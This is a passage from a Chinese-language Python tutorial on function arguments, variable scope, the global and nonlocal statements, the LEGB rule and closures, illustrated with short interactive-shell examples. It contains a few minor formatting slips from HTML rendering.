<h3 id="14-5-位置参数"><a href="#14-5-位置参数" class="headerlink" title="14.5 位置参数"></a>14.5 位置参数</h3><p>在通常的情况下，实参是按照形参定义的顺序进行传递的：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; def myfunc(s, vt, o):</span><br><span class="line">...    return &quot;&quot;.join((o, vt, s))</span><br><span class="line">...</span><br><span class="line">&gt;&gt;&gt; myfunc(&quot;我&quot;, &quot;打了&quot;, &quot;小甲鱼&quot;)</span><br><span class="line">&#x27;小甲鱼打了我&#x27;</span><br><span class="line">&gt;&gt;&gt; myfunc(&quot;小甲鱼&quot;, &quot;打了&quot;, &quot;我&quot;)</span><br><span class="line">&#x27;我打了小甲鱼&#x27;</span><br></pre></td></tr></table></figure><br>由于在定义函数的时候，就已经把参数的名字和位置确定了下来，我们将 Python 中这类位置固定的参数称之为位置参数。</p>
<h3 id="14-6-关键字参数"><a href="#14-6-关键字参数" class="headerlink" title="14.6 关键字参数"></a>14.6 关键字参数</h3><p>使用关键字参数，我们只需要知道形参的名字就可以：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; myfunc(o=&quot;我&quot;, vt=&quot;打了&quot;, s=&quot;小甲鱼&quot;)</span><br><span class="line">&#x27;我打了小甲鱼&#x27;</span><br></pre></td></tr></table></figure>
<p>尽管使用关键字参数需要你多敲一些字符，但对于参数特别多的函数，这一招尤其管用。<br>如果同时使用位置参数和关键字参数，那么使用顺序是需要注意一下的：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; myfunc(o=&quot;我&quot;, &quot;清蒸&quot;, &quot;小甲鱼&quot;)</span><br><span class="line">SyntaxError: positional argument follows keyword argument</span><br></pre></td></tr></table></figure>
<p>比如这样就不行了，因为位置参数必须是在关键字参数之前，之间也不行哈。</p>
<h3 id="14-7-默认参数"><a href="#14-7-默认参数" class="headerlink" title="14.7 默认参数"></a>14.7 默认参数</h3><p>Python 还允许函数的参数在定义的时候指定默认值，这样以来，在函数调用的时候，如果没有传入实参，那么将采用默认的参数值代替：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; def myfunc(s, vt, o=&quot;小甲鱼&quot;):</span><br><span class="line">...     return &quot;&quot;.join((o, vt, s))</span><br><span class="line">...</span><br><span class="line">&gt;&gt;&gt; myfunc(&quot;香蕉&quot;, &quot;吃&quot;)</span><br><span class="line">&#x27;小甲鱼吃香蕉&#x27;</span><br></pre></td></tr></table></figure><br>默认参数的意义就是当用户没有输入该参数的时候，有一个默认值可以使用，不至于造成错误。<br>如果用户指定了该参数值，那么默认的值就会被覆盖：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; myfunc(&quot;香蕉&quot;, &quot;吃&quot;, &quot;不二如是&quot;)</span><br><span class="line">&#x27;不二如是吃香蕉&#x27;</span><br></pre></td></tr></table></figure><br>这里也有一点是需要注意的，就是如果要使用默认参数，那么应该把它们摆在最后：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; def myfunc(s=&quot;苹果&quot;, vt, o=&quot;小甲鱼&quot;):</span><br><span class="line">        </span><br><span class="line">SyntaxError: non-default argument follows default argument</span><br><span class="line">&gt;&gt;&gt; def myfunc(vt, s=&quot;苹果&quot;, o=&quot;小甲鱼&quot;):</span><br><span class="line">...     return &quot;&quot;.join((o, vt, s))</span><br><span class="line">... </span><br><span class="line">&gt;&gt;&gt; myfunc(&quot;拱了&quot;)</span><br><span class="line">&#x27;小甲鱼拱了苹果&#x27;</span><br></pre></td></tr></table></figure></p>
<h3 id="14-8-只能使用位置参数"><a href="#14-8-只能使用位置参数" class="headerlink" title="14.8 只能使用位置参数"></a>14.8 只能使用位置参数</h3><p>咱们在使用 help() 函数查看函数文档的时候呢，经常会在函数原型的参数中发现一个斜杠（/），比如：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; help(abs)</span><br><span class="line">Help on built-in function abs in module builtins:</span><br><span class="line">    </span><br><span class="line">abs(x, /)</span><br><span class="line">    Return the absolute value of the argument.</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; help(sum)</span><br><span class="line">Help on built-in function sum in module builtins:</span><br><span class="line">    </span><br><span class="line">sum(iterable, /, start=0)</span><br><span class="line">    Return the sum of a &#x27;start&#x27; value (default: 0) plus an iterable of numbers</span><br><span class="line">    </span><br><span class="line">    When the iterable is empty, return the start value.</span><br><span class="line">    This function is intended specifically for use with numeric values and may</span><br><span class="line">    reject non-numeric types.</span><br></pre></td></tr></table></figure><br>这表示斜杠左侧的参数必须传递位置参数，不能是关键字参数，举个例子：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; abs(-1.5)</span><br><span class="line">1.5</span><br><span class="line">&gt;&gt;&gt; abs(x = -1.5)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&lt;pyshell#67&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">    abs(x = -1.5)</span><br><span class="line">TypeError: abs() takes no keyword arguments</span><br></pre></td></tr></table></figure><br>那斜杠右侧的话呢，就随你了：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; sum([1, 2, 3], start=6)</span><br><span class="line">12</span><br><span class="line">&gt;&gt;&gt; sum([1, 2, 3], 6)</span><br><span class="line">12</span><br></pre></td></tr></table></figure></p>
<h3 id="14-9-只能使用关键字参数"><a href="#14-9-只能使用关键字参数" class="headerlink" title="14.9 只能使用关键字参数"></a>14.9 只能使用关键字参数</h3><p>既然有限制 “只能使用位置参数”，那有没有那种限制 “只能使用关键字参数” 的语法呢？<br>那就是利用星号（*）：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; def abc(a, *, b, c):</span><br><span class="line">...     print(a, b, c)</span><br></pre></td></tr></table></figure><br>这样，参数 a 既可以是位置参数也可以是关键字参数，但参数 b 和参数 c 就必须是关键字参数，才不会报错：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; abc(1, 2, 3)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&lt;pyshell#98&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">    abc(1, 2, 3)</span><br><span class="line">TypeError: abc() takes 1 positional argument but 3 were given</span><br><span class="line">&gt;&gt;&gt; abc(1, b=2, c=3)</span><br><span class="line">1 2 3</span><br><span class="line">&gt;&gt;&gt; abc(a=3, b=2, c=1)</span><br><span class="line">3 2 1</span><br></pre></td></tr></table></figure></p>
<h3 id="14-10-收集参数"><a href="#14-10-收集参数" class="headerlink" title="14.10 收集参数"></a>14.10 收集参数</h3><p>当我们在定义一个函数的时候，假如需要传入的参数的个数是不确定的，按照一般的写法可能需要定义很多个相同的函数然后指定不同的参数个数，这显然是很麻烦的，不能根本解决问题。<br>为解决这个问题，Python 就推出了收集参数的概念。所谓的收集参数，就是说只指定一个参数，然后允许调用函数时传入任意数量的参数。<br>定义收集参数其实也很简单，即使在形参的前面加上星号（*）来表示：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; def myfunc(*args):</span><br><span class="line">...     print(&quot;有%d个参数。&quot; % len(args))</span><br><span class="line">...     print(&quot;第2个参数是：%s&quot; % args[1])</span><br><span class="line">...</span><br><span class="line">&gt;&gt;&gt; myfunc(&quot;小甲鱼&quot;, &quot;不二如是&quot;)</span><br><span class="line">有2个参数。</span><br><span class="line">第2个参数是：不二如是</span><br><span class="line">&gt;&gt;&gt; myfunc(1, 2, 3, 4, 5)</span><br><span class="line">有5个参数。</span><br><span class="line">第二个参数是：2</span><br></pre></td></tr></table></figure></p>
<p>如果在收集参数后面还需要指定其它参数，那么在调用函数的时候就应该使用关键参数来指定后面的参数：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; def myfunc(*args, a, b):</span><br><span class="line">...     print(args, a, b)</span><br><span class="line">... </span><br><span class="line">&gt;&gt;&gt; myfunc(1, 2, 3, a=4, b=5)</span><br><span class="line">(1, 2, 3) 4 5</span><br></pre></td></tr></table></figure>
<p>对于这种情况，在传递参数的时候就必须要使用关键字参数了，因为字典的元素都是键值对嘛，所以等号（=）左侧是键，右侧是值：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; myfunc(a=1, b=2, c=3)</span><br><span class="line">&#123;&#x27;a&#x27;: 1, &#x27;b&#x27;: 2, &#x27;c&#x27;: 3&#125;</span><br></pre></td></tr></table></figure><br>混合起来使用就更加灵活了：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; def myfunc(a, *b, **c):</span><br><span class="line">...     print(a, b, c)</span><br><span class="line">... </span><br><span class="line">&gt;&gt;&gt; myfunc(1, 2, 3, 4, x=5, y=6)</span><br><span class="line">1 (2, 3, 4) &#123;&#x27;x&#x27;: 5, &#x27;y&#x27;: 6&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="14-11-解包参数"><a href="#14-11-解包参数" class="headerlink" title="14.11 解包参数"></a>14.11 解包参数</h3><p>这一个星号（<em>）和两个星号（<em>*）不仅可以用在函数定义的时候，在函数调用的时候也有特殊效果，在形参上使用称之为参数的打包，在实参上的使用，则起到了相反的效果，即解包参数：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; args = (1, 2, 3, 4)</span><br><span class="line">&gt;&gt;&gt; def myfunc(a, b, c, d):</span><br><span class="line">...     print(a, b, c, d)</span><br><span class="line">... </span><br><span class="line">&gt;&gt;&gt; myfunc(*args)</span><br><span class="line">1 2 3 4</span><br></pre></td></tr></table></figure><br>那么两个星号（</em></em>）对应的是关键字参数：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; args = &#123;&#x27;a&#x27;:1, &#x27;b&#x27;:2, &#x27;c&#x27;:3, &#x27;d&#x27;:4&#125;</span><br><span class="line">&gt;&gt;&gt; myfunc(**args)</span><br><span class="line">1 2 3 4</span><br></pre></td></tr></table></figure></p>
<h3 id="14-12-局部作用域"><a href="#14-12-局部作用域" class="headerlink" title="14.12 局部作用域"></a>14.12 局部作用域</h3><p>如果一个变量定义的位置是在一个函数里面，那么它的作用域就仅限于函数中，我们将它称为局部变量。<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; def myfunc():</span><br><span class="line">...     x = 520</span><br><span class="line">...     print(x)</span><br><span class="line">... </span><br><span class="line">&gt;&gt;&gt; myfunc()</span><br><span class="line">520</span><br></pre></td></tr></table></figure><br>变量 x 是在函数 myfunc() 中定义的，所以它的作用域仅限于该函数，如果我们尝试在函数的外部访问这个变量，那么就会报错：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; print(x)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&lt;pyshell#5&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">    print(x)</span><br><span class="line">NameError: name &#x27;x&#x27; is not defined</span><br></pre></td></tr></table></figure></p>
<h3 id="14-13-全局作用域"><a href="#14-13-全局作用域" class="headerlink" title="14.13 全局作用域"></a>14.13 全局作用域</h3><p>如果是在任何函数的外部去定义一个变量，那么它的作用域就是全局的，我们也将其称为全局变量：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; x = 880</span><br><span class="line">&gt;&gt;&gt; def myfunc():</span><br><span class="line">...     print(x)</span><br><span class="line">... </span><br><span class="line">&gt;&gt;&gt; myfunc()</span><br><span class="line">880</span><br></pre></td></tr></table></figure><br>如果在函数中存在一个跟全局变量同名的局部变量，会发生什么样的事情呢？<br>在函数中，局部变量就会覆盖同名的全局变量的值：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; x = 880</span><br><span class="line">&gt;&gt;&gt; def myfunc():</span><br><span class="line">...     x = 520</span><br><span class="line">...     print(x)</span><br><span class="line">... </span><br><span class="line">&gt;&gt;&gt; myfunc()</span><br><span class="line">520</span><br><span class="line">&gt;&gt;&gt; print(x)</span><br><span class="line">880</span><br></pre></td></tr></table></figure><br>注意：代码中两个 x 并非同一个变量，只是由于作用域不同，它们同名但并不同样。</p>
<h3 id="14-14-global-语句"><a href="#14-14-global-语句" class="headerlink" title="14.14 global 语句"></a>14.14 global 语句</h3><p>通常我们无法在函数内部修改全局变量的值，除非使用 global 语句破除限制：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; x = 880</span><br><span class="line">&gt;&gt;&gt; def myfunc():</span><br><span class="line">...     global x</span><br><span class="line">...     x = 520</span><br><span class="line">...     print(x)</span><br><span class="line">... </span><br><span class="line">&gt;&gt;&gt; myfunc()</span><br><span class="line">520</span><br><span class="line">&gt;&gt;&gt; print(x)</span><br><span class="line">520</span><br></pre></td></tr></table></figure></p>
<h3 id="14-15-嵌套函数"><a href="#14-15-嵌套函数" class="headerlink" title="14.15 嵌套函数"></a>14.15 嵌套函数</h3><p>函数也是可以嵌套的：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; def funA():</span><br><span class="line">...     x = 520</span><br><span class="line">...     def funB():</span><br><span class="line">...         x = 880</span><br><span class="line">...         print(&quot;In funB, x =&quot;, x)</span><br><span class="line">...     print(&quot;In funA, x =&quot;, x)</span><br></pre></td></tr></table></figure><br>在外部函数 funA() 里面嵌套了一个内部函数 funB()，那么这个内部函数是无法被直接调用的：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; funB()</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&lt;pyshell#23&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">    funB()</span><br><span class="line">NameError: name &#x27;funB&#x27; is not defined</span><br></pre></td></tr></table></figure><br>想要调用 funB()，必须得通过 funA()：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; def funA():</span><br><span class="line">...     x = 520</span><br><span class="line">...     def funB():</span><br><span class="line">...         x = 880</span><br><span class="line">...         print(&quot;In funB, x =&quot;, x)</span><br><span class="line">...     funB()</span><br><span class="line">...     print(&quot;In funA, x =&quot;, x)</span><br><span class="line">... </span><br><span class="line">&gt;&gt;&gt; funA()</span><br><span class="line">In funB, x = 880</span><br><span class="line">In funA, x = 520</span><br></pre></td></tr></table></figure></p>
<h3 id="14-16-nonlocal-语句"><a href="#14-16-nonlocal-语句" class="headerlink" title="14.16 nonlocal 语句"></a>14.16 nonlocal 语句</h3><p>通常我们无法在嵌套函数的内部修改外部函数变量的值，除非使用 nonlocal 语句破除限制：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; def funA():</span><br><span class="line">...     x = 520</span><br><span class="line">...     def funB():</span><br><span class="line">...         nonlocal x</span><br><span class="line">...         x = 880</span><br><span class="line">...         print(&quot;In funB, x =&quot;, x)</span><br><span class="line">...     funB()</span><br><span class="line">...     print(&quot;In funA, x =&quot;, x)</span><br><span class="line">... </span><br><span class="line">&gt;&gt;&gt; funA()</span><br><span class="line">In funB, x = 880</span><br><span class="line">In funA, x = 880</span><br></pre></td></tr></table></figure></p>
<h3 id="14-17-LEGB-规则"><a href="#14-17-LEGB-规则" class="headerlink" title="14.17 LEGB 规则"></a>14.17 LEGB 规则</h3><p>只要记住 LEGB，那么就相当于掌握了 Python 变量的解析机制。</p>
<p>其中：</p>
<ul>
<li>L 是 Local，是局部作用域</li>
<li>E 是 Enclosed，是嵌套函数的外层函数作用域</li>
<li>G 是 Global，是全局作用域</li>
<li>B 是 Build-In，也就是内置作用域</li>
</ul>
<p>最后一个是 B，也就是 Build-In，最没地位的那一个。</p>
<p>比如说 Build-In Function —— BIF，你只要起一个变量名跟它一样，那么就足以把这个内置函数给 “毁了”：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; str = &quot;小甲鱼把str给毁了&quot;</span><br><span class="line">&gt;&gt;&gt; str(520)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&lt;pyshell#1&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">    str(520)</span><br><span class="line">TypeError: &#x27;str&#x27; object is not callable</span><br></pre></td></tr></table></figure><br>是不是，它本来的功能是将参数转换成字符串类型，但由于我们将它作为变量名赋值了，那么 Python 就把它给覆盖了：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; str</span><br><span class="line">&#x27;小甲鱼把str给毁了&#x27;</span><br></pre></td></tr></table></figure></p>
<h3 id="14-18-嵌套作用域的特性"><a href="#14-18-嵌套作用域的特性" class="headerlink" title="14.18 嵌套作用域的特性"></a>14.18 嵌套作用域的特性</h3><p>对于嵌套函数来说，外层函数的作用域是会通过某种形式保存下来的，它并不会跟局部作用域那样，调用完就消失。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; def funA():</span><br><span class="line">...     x = 520</span><br><span class="line">...     def funB():</span><br><span class="line">...         print(x)</span><br><span class="line">...     return funB</span><br><span class="line">&gt;&gt;&gt; funA()</span><br><span class="line">&lt;function funA.&lt;locals&gt;.funB at 0x0000014C02684040&gt;</span><br><span class="line">&gt;&gt;&gt; funA()()</span><br><span class="line">520</span><br><span class="line">&gt;&gt;&gt; funny = funA()</span><br><span class="line">&gt;&gt;&gt; funny</span><br><span class="line">&lt;function funA.&lt;locals&gt;.funB at 0x0000014C02684550&gt;</span><br><span class="line">&gt;&gt;&gt; funny()</span><br><span class="line">520</span><br></pre></td></tr></table></figure>
<h3 id="14-19-闭包"><a href="#14-19-闭包" class="headerlink" title="14.19 闭包"></a>14.19 闭包</h3><p>所谓闭包（closure），也有人称之为工厂函数（factory function）。</p>
<p>for example:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; def power(exp):</span><br><span class="line">...     def exp_of(base):</span><br><span class="line">...         return base ** exp</span><br><span class="line">...     return exp_of</span><br><span class="line">... </span><br><span class="line">&gt;&gt;&gt; square = power(2)</span><br><span class="line">&gt;&gt;&gt; cube = power(3)</span><br><span class="line">&gt;&gt;&gt; square</span><br><span class="line">&lt;function power.&lt;locals&gt;.exp_of at 0x000001CF6A1FAF70&gt;</span><br><span class="line">&gt;&gt;&gt; square(2)</span><br><span class="line">4</span><br><span class="line">&gt;&gt;&gt; square(5)</span><br><span class="line">25</span><br><span class="line">&gt;&gt;&gt; cube(2)</span><br><span class="line">8</span><br><span class="line">&gt;&gt;&gt; cube(5)</span><br><span class="line">125</span><br></pre></td></tr></table></figure><br>这里 power() 函数就像是一个工厂，由于参数不同，得到了两个不同的 “生产线”，一个是 square()，一个是 cube()，前者是返回参数的平方，后者是返回参数的立方。</p>
<h3 id="14-20-闭包应用举例"><a href="#14-20-闭包应用举例" class="headerlink" title="14.20 闭包应用举例"></a>14.20 闭包应用举例</h3><p>比如说在游戏开发中，我们需要将游戏中角色的移动位置保护起来，不希望被其他函数轻易就能够修改，所以我们就可以利用闭包：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">origin = (0, 0)        # 这个是原点</span><br><span class="line">legal_x = [-100, 100]  # 限定x轴的移动范围</span><br><span class="line">legal_y = [-100, 100]  # 限定y轴的移动范围</span><br><span class="line"># 好，接着我们定义一个create()函数</span><br><span class="line"># 初始化位置是原点</span><br><span class="line">def create(pos_x=0, pos_y=0):</span><br><span class="line">    # 然后我们定义一个实现角色移动的函数moving()</span><br><span class="line">    def moving(direction, step):</span><br><span class="line">    # direction参数设置方向，1为向右或向上，-1为向左或向下，如果是0则不移动</span><br><span class="line">    # step参数是设置移动的距离</span><br><span class="line">        # 为了修改外层作用域的变量</span><br><span class="line">        nonlocal pos_x, pos_y</span><br><span class="line">        # 然后我们真的就去修改它们</span><br><span class="line">        new_x = pos_x + direction[0] * step</span><br><span class="line">        new_y = pos_y + direction[1] * step</span><br><span class="line">        # 检查移动后是否超出x轴的边界</span><br><span class="line">        if new_x &lt; legal_x[0]:</span><br><span class="line">            # 制造一个撞墙反弹的效果</span><br><span class="line">            pos_x = legal_x[0] - (new_x - legal_x[0])</span><br><span class="line">        elif new_x &gt; legal_x[1]:</span><br><span class="line">            pos_x = legal_x[1] - (new_x - legal_x[1])</span><br><span class="line">        else:</span><br><span class="line">            pos_x = new_x</span><br><span class="line">        # 检查移动后是否超出y轴边界</span><br><span class="line">        if new_y &lt; legal_y[0]:</span><br><span class="line">            pos_y = legal_y[0] - (new_y - legal_y[0])</span><br><span class="line">        elif new_y &gt; legal_y[1]:</span><br><span class="line">            pos_y = legal_y[1] - (new_y - legal_y[1])</span><br><span class="line">        else:</span><br><span class="line">            pos_y = new_y</span><br><span class="line">        # 将最终修改后的位置作为结果返回</span><br><span class="line">        return pos_x, pos_y</span><br><span class="line">    # 外层函数返回内层函数的引用</span><br><span class="line">    return moving</span><br></pre></td></tr></table></figure>
<p>程序实现如下：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; move = create()</span><br><span class="line">&gt;&gt;&gt; print(&quot;向右移动20步后，位置是:&quot;, move([1, 0], 20))</span><br><span class="line">向右移动20步后，位置是: (20, 0)</span><br><span class="line">&gt;&gt;&gt; print(&quot;向上移动120步后，位置是:&quot;, move([0, 1], 120))</span><br><span class="line">向上移动120步后，位置是: (20, 80)</span><br><span class="line">&gt;&gt;&gt; print(&quot;向左移动66步后，位置是:&quot;, move([-1, 0], 66))</span><br><span class="line">向左移动66步后，位置是: (-46, 80)</span><br><span class="line">&gt;&gt;&gt; print(&quot;向右下角移动88步后，位置是:&quot;, move([1, -1]), 88)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&lt;pyshell#28&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">    print(&quot;向右下角移动88步后，位置是:&quot;, move([1, -1]), 88)</span><br><span class="line">TypeError: moving() missing 1 required positional argument: &#x27;step&#x27;</span><br><span class="line">&gt;&gt;&gt; print(&quot;向右下角移动88步后，位置是:&quot;, move([1, -1], 88))</span><br><span class="line">向右下角移动88步后，位置是: (42, -8)</span><br></pre></td></tr></table></figure></p>
<h3 id="14-21-装饰器"><a href="#14-21-装饰器" class="headerlink" title="14.21 装饰器"></a>14.21 装饰器</h3><p>装饰器本质上也是一个函数，它可以让其他函数在不需要做任何代码变动的前提下增加额外的功能。</p>
